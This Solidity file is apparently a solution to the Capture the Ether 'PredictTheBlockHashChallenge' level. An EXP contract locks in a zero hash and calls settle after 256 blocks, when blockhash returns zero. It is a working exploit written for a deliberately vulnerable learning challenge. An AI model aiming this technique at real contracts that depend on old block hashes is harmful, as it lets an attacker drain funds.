pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {}

    function isComplete() public view returns (bool) {}

    function lockInGuess(bytes32 hash) public payable {}

    function settle() public {}
}

contract EXP {
    PredictTheBlockHashChallenge victim;

    constructor(address _addr) public payable {
        victim = PredictTheBlockHashChallenge(_addr);
        victim.lockInGuess.value(1 ether)(0);
    }

    function wait_for_256_block() public {
        victim.settle();
    }
}

